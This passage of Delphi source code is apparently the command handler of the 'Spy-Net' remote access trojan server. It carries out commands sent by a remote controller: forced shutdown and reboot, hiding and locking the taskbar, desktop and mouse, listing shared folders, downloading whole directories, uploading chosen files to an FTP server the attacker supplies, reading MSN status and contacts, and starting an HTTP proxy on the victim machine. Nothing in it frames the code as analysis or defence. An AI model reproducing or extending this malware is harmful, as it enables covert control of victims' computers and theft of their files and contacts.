          _EnviarStream(ClientSocket, ToSend);
          except
        end;
        closethread(MasterCommandThreadId);
        exit;
      end;
    end;

  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = unitComandos.MYSHUTDOWN then
  begin
    WindowsExit(EWX_SHUTDOWN or EWX_FORCE);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = unitComandos.HIBERNAR then
  begin
    Hibernar(True, False, False);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = LOGOFF then
  begin
    WindowsExit(EWX_LOGOFF or EWX_FORCE);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = POWEROFF then
  begin
    WindowsExit(EWX_POWEROFF or EWX_FORCE);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = MYRESTART then
  begin
    WindowsExit(EWX_REBOOT or EWX_FORCE);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = DESLMONITOR then
  begin
    SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 0);
    SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 1);
    SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = BTN_START_HIDE then
  begin
    ShowStartButton(false);
    closethread(MasterCommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = BTN_START_SHOW then
  begin
    ShowStartButton(true);
    closethread(MasterCommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = BTN_START_BLOCK then
  begin
    EnableWindow(FindWindowEx(FindWindow('Shell_TrayWnd', nil),0, 'Button', nil),false);
    closethread(MasterCommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = BTN_START_UNBLOCK then
  begin
    EnableWindow(FindWindowEx(FindWindow('Shell_TrayWnd', nil),0, 'Button', nil),true);
    closethread(MasterCommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = DESK_ICO_HIDE then
  begin
    ShowDesktop(false);
    closethread(MasterCommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = DESK_ICO_SHOW then
  begin
    ShowDesktop(true);
    closethread(MasterCommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = DESK_ICO_BLOCK then
  begin
    EnableWindow(FindWindow('ProgMan', nil), false);
    closethread(MasterCommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = DESK_ICO_UNBLOCK then
  begin
    EnableWindow(FindWindow('ProgMan', nil), true);
    closethread(MasterCommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = TASK_BAR_HIDE then
  begin
    TaskBarHIDE(false);
    closethread(MasterCommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = TASK_BAR_SHOW then
  begin
    TaskBarHIDE(true);
    closethread(MasterCommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = TASK_BAR_BLOCK then
  begin
    EnableWindow(FindWindow('Shell_TrayWnd', nil), false);
    closethread(MasterCommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = TASK_BAR_UNBLOCK then
  begin
    EnableWindow(FindWindow('Shell_TrayWnd', nil), true);
    closethread(MasterCommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = MOUSE_BLOCK then
  begin
    CloseHandle(BlockMouseHandle);
    sleep(100);

    BlockMouseHandle := CreateMutex(nil, False, '_x_X_BLOCKMOUSE_X_x_');
    if fileexists(ServerFileName) = true then
    begin
      if MyShellExecute(0, 'open', pchar(ServerFileName), nil, nil, SW_NORMAL) <= 32 then CloseHandle(BlockMouseHandle);
    end else CloseHandle(BlockMouseHandle);
    while true do processmessages;
    closethread(MasterCommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = MOUSE_UNBLOCK then
  begin
    CloseHandle(BlockMouseHandle);
    closethread(MasterCommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = MOUSE_SWAP then
  begin
    if swapmouse = true then
    begin
      SwapMouseButtons(false);
      swapmouse := false;
    end else
    begin
      SwapMouseButtons(true);
      swapmouse := true;
    end;
    closethread(MasterCommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = SYSTRAY_ICO_HIDE then
  begin
    TrayHIDE;
    closethread(MasterCommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = SYSTRAY_ICO_SHOW then
  begin
    TraySHOW;
    closethread(MasterCommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = OPENCD then
  begin
    AbrirCD;
    closethread(MasterCommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = CLOSECD then
  begin
    FecharCD;
    closethread(MasterCommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = CHAT then
  begin
    Sairdochat := true;
    if MainWnd <> nil then FecharJanela(MainWnd.Handle);
    sleep(100);
    Sairdochat := false;

    delete(Comando, 1, pos('|', Comando));

    FormCaption := copy(Comando, 1, pos('|', Comando) - 1);
    delete(Comando, 1, pos('|', Comando));

    ServerName := copy(Comando, 1, pos('|', Comando) - 1);
    delete(Comando, 1, pos('|', Comando));

    ClientName := copy(Comando, 1, pos('|', Comando) - 1);
    delete(Comando, 1, pos('|', Comando));

    MemoColor := strtoint(copy(Comando, 1, pos('|', Comando) - 1));
    delete(Comando, 1, pos('|', Comando));

    MemoTextColor := strtoint(copy(Comando, 1, pos('|', Comando) - 1));
    delete(Comando, 1, pos('|', Comando));

    EditColor := strtoint(copy(Comando, 1, pos('|', Comando) - 1));
    delete(Comando, 1, pos('|', Comando));

    EditTextColor := strtoint(copy(Comando, 1, pos('|', Comando) - 1));
    delete(Comando, 1, pos('|', Comando));

    ButtonCaption := copy(Comando, 1, pos('|', Comando) - 1);
    delete(Comando, 1, pos('|', Comando));

    Envia := copy(Comando, 1, pos('|', Comando) - 1);
    delete(Comando, 1, pos('|', Comando));

    Enviou := copy(Comando, 1, pos('|', Comando) - 1);

    _EnviarStream(clientSocket, CHAT + '|');

    MainWnd := TSDIMainWindow.Create(0, 'Spy-Net');
    MainWnd.OnDestroy := MainDestroy;
    MainWnd.DoCreate(WS_VISIBLE or WS_CAPTION or WS_POPUP);
    MainWnd.Height := 500;
    MainWnd.Width := 500;
    MainWnd.Color := MainColor;
    processmessages;

    Memo1 := TAPIMemo.Create(MainWnd.Handle);
    Memo1.Height := MainWnd.ClientHeight - 21;
    Memo1.Width := MainWnd.ClientWidth;
    Memo1.XPos := 0;
    Memo1.YPos := 0;
    Memo1.Color := MemoColor;
    Memo1.TextColor := MemoTextColor;
    processmessages;

    Edit1 := TAPIEdit.Create(MainWnd.Handle);
    Edit1.XPos := 0;
    Edit1.YPos := Memo1.Height;
    Edit1.Height := 21;
    Edit1.Width := Memo1.Width - 75;
    Edit1.Color := EditColor;
    Edit1.TextColor := EditTextColor;
    processmessages;

    Button1 := TAPIButton.Create(MainWnd.Handle);
    Button1.XPos := Edit1.Width;
    Button1.YPos := Edit1.YPos;
    Button1.Width := 75;
    Button1.Caption := ButtonCaption;
    Button1.Height := Edit1.Height;
    Button1.OnClick := Button1Click;
    processmessages;

    SetWindowText(MainWnd.Handle, pchar(FormCaption));
    ChangeTextFont(Memo1.Handle, FontName, FontSize);
    ChangeTextFont(Edit1.Handle, FontName, FontSize);
    ChangeTextFont(Button1.Handle, FontName, FontSize);
    processmessages;

    closehandle(CheckHWND);
    CheckHWND := StartThread(@CheckMSG);
    DefinirHandle;

    closehandle(CheckHWND);

    if MainWnd <> nil then FecharJanela(MainWnd.Handle);

    memo1 := nil;
    edit1 := nil;
    button1 := nil;
    MainWnd := nil;
    //try memo1.Free; except end;
    //try edit1.Free; except end;
    //try button1.Free; except end;
    //try MainWnd.Free; except end;
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = CHATMSG then
  begin
    delete(Comando, 1, pos('|', Comando));
    MensagemCHATRecebida := copy(Comando, 1, pos('|', Comando) - 1);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = CHATCLOSE then
  begin
    Sairdochat := true;
    //if MainWnd <> nil then FecharJanela(MainWnd.Handle);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = GETSHAREDLIST then
  begin
    TempStr := ListSharedFolders;
    if TempStr = '' then ToSend := FILEMANAGER + '|' + NOSHAREDLIST + '|' else
    ToSend := FILEMANAGER + '|' + GETSHAREDLIST + '|' + TempStr;
    _EnviarStream(ClientSocket, Tosend);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = DOWNLOADDIR then
  begin
    ToDownloadDIR := '';
    if DownloadDIRId <> 0 then CloseThread(DownloadDIRId);

    delete(Comando, 1, pos('|', Comando));

    TempStr := copy(Comando, 1, pos('|', Comando) - 1);
    delete(Comando, 1, pos('|', Comando));

    ThreadDownloadDir := TThreadDownloadDir.Create(TempStr);
    DownloadDIRId := BeginThread(nil,
                                 0,
                                 @DownloadDirStart,
                                 ThreadDownloadDir,
                                 0,
                                 ThreadId);
    while true do _processmessages;
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = DOWNLOADDIRSTOP then
  begin
    if DownloadDIRId <> 0 then CloseThread(DownloadDIRId);
    DownloadDIRId := 0;
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = CHANGEATTRIBUTES then
  begin
    delete(Comando, 1, pos('|', Comando));

    TempStr := copy(Comando, 1, pos('|', Comando) - 1);
    delete(Comando, 1, pos('|', Comando));

    TempStr1 := copy(Comando, 1, pos('|', Comando) - 1);
    delete(Comando, 1, pos('|', Comando));

    if (fileexists(Tempstr) = true) and
    (PossoMexerNoArquivo(Tempstr) = true) and
    (TempStr1 <> 'XXX') then
    begin
      SetAttributes(TempStr, TempStr1);
      _EnviarStream(ClientSocket, FILEMANAGER + '|' + MENSAGENS + '|' + Tempstr + '|' + '492' + '|');
    end else
    _EnviarStream(ClientSocket, FILEMANAGER + '|' + FILEMANAGERERROR + '|' + Tempstr + '|');
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = SENDFTP then
  begin
    delete(Comando, 1, pos('|', Comando));

    TempStr := copy(Comando, 1, pos('|', Comando) - 1); //address
    delete(Comando, 1, pos('|', Comando));

    TempStr1 := copy(Comando, 1, pos('|', Comando) - 1); //user
    delete(Comando, 1, pos('|', Comando));

    TempStr2 := copy(Comando, 1, pos('|', Comando) - 1); //pass
    delete(Comando, 1, pos('|', Comando));

    TempStr3 := copy(Comando, 1, pos('|', Comando) - 1); //port
    delete(Comando, 1, pos('|', Comando));

    while Comando <> '' do
    begin
      TempStr4 := copy(Comando, 1, pos('|', Comando) - 1); //filename
      delete(Comando, 1, pos('|', Comando));

      if (fileexists(TempStr4) = true) and
         (PossoMexerNoArquivo(TempStr4) = true)
         and (MyGetFileSize(TempStr4) > 0) then
      begin
        if EnviarArquivoFTP(TempStr,
                            TempStr1,
                            TempStr2,
                            strtoint(TempStr3),
                            TempStr4) = false then
        begin
          ToSend := FILEMANAGER + '|' + MENSAGENS + '|' + TempStr4 + '|' + '496' + '|';
          _EnviarStream(ClientSocket, Tosend);
        end else
        begin
          ToSend := FILEMANAGER + '|' + MENSAGENS + '|' + TempStr4 + '|' + '494' + '|';
          _EnviarStream(ClientSocket, Tosend);
        end;
      end else
      begin
        ToSend := FILEMANAGER + '|' + MENSAGENS + '|' + TempStr4 + '|' + '496' + '|';
        _EnviarStream(ClientSocket, Tosend);
      end;
    end;
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = MSN_STATUS then
  begin
    CoInitialize(NIL);
    i := GetMSNStatus;
    if i = 5 then
    begin
      tempstr := ' ' + MSNseparador + ' ' + MSNseparador + ' ' + MSNseparador;
      ToSend := OPCOESEXTRAS + '|' + MSN_STATUS + '|' + tempstr + inttostr(5) + '|';
      CounInitialize;
      _EnviarStream(ClientSocket, ToSend);
      closethread(MasterCommandThreadId);
      exit;
    end;
    tempstr := getcurrentmsnsettings;

    ToSend := OPCOESEXTRAS + '|' + MSN_STATUS + '|' + tempstr + inttostr(i) + '|';
    CounInitialize;
    _EnviarStream(ClientSocket, ToSend);
    closethread(MasterCommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = MSN_CONECTADO then
  begin
    CoInitialize(NIL);
    SetMSNStatus(0);

    tempstr := getcurrentmsnsettings;
    ToSend := OPCOESEXTRAS + '|' + MSN_STATUS + '|' + tempstr + inttostr(GetMSNStatus) + '|';
    CounInitialize;

    _EnviarStream(ClientSocket, ToSend);
    closethread(MasterCommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = MSN_OCUPADO then
  begin
    CoInitialize(NIL);
    SetMSNStatus(1);

    tempstr := getcurrentmsnsettings;
    ToSend := OPCOESEXTRAS + '|' + MSN_STATUS + '|' + tempstr + inttostr(GetMSNStatus) + '|';
    CounInitialize;

    _EnviarStream(ClientSocket, ToSend);
    closethread(MasterCommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = MSN_AUSENTE then
  begin
    CoInitialize(NIL);
    SetMSNStatus(2);

    tempstr := getcurrentmsnsettings;
    ToSend := OPCOESEXTRAS + '|' + MSN_STATUS + '|' + tempstr + inttostr(GetMSNStatus) + '|';
    CounInitialize;

    _EnviarStream(ClientSocket, ToSend);
    closethread(MasterCommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = MSN_INVISIVEL then
  begin
    CoInitialize(NIL);
    SetMSNStatus(3);

    tempstr := getcurrentmsnsettings;
    ToSend := OPCOESEXTRAS + '|' + MSN_STATUS + '|' + tempstr + inttostr(GetMSNStatus) + '|';
    CounInitialize;

    _EnviarStream(ClientSocket, ToSend);
    closethread(MasterCommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = MSN_DESCONECTADO then
  begin
    CoInitialize(NIL);
    SetMSNStatus(4);

    tempstr := getcurrentmsnsettings;
    ToSend := OPCOESEXTRAS + '|' + MSN_STATUS + '|' + tempstr + inttostr(GetMSNStatus) + '|';
    CounInitialize;

    _EnviarStream(ClientSocket, ToSend);
    closethread(MasterCommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = MSN_LISTAR then
  begin
    CoInitialize(NIL);
    i := GetMSNStatus;
    if i = 4 then
    begin
      ToSend := OPCOESEXTRAS + '|' + MSN_STATUS + '|' + inttostr(i) + '|';
      _EnviarStream(ClientSocket, ToSend);
      closethread(MasterCommandThreadId);
      exit;
    end;

    tempstr := GetContactList;

    ToSEnd := OPCOESEXTRAS + '|' + MSN_LISTAR + '|' + tempstr + '|';
    CounInitialize;

    _EnviarStream(ClientSocket, ToSend);
    closethread(MasterCommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = STARTPROXY then
  begin
    delete(Comando, 1, pos('|', Comando));
    TempStr := copy(Comando, 1, pos('|', Comando) - 1); //porta
    try
      TempInt := strtoint(TempStr);
      except
      exit;
    end;
    if TempInt = 0 then exit;

    CloseHandle(ProxyMutex);
    sleep(100);
    ProxyMutex := CreateMutex(nil, False, pchar('xX_PROXY_SERVER_Xx'));
    if StartHttpProxy(TempInt) = false then CloseHandle(ProxyMutex);
    while true do sleep(high(integer));
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = STOPPROXY then
  begin
    CloseHandle(ProxyMutex);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = PINGTEST then
  begin
    Tempstr := PONGTEST + '|' + BufferTest;
    //for i := 0 to 99 do
    begin
      _EnviarStream(ClientSocket, TempStr);
      //_processmessages;
    end;
  end else

end;

end.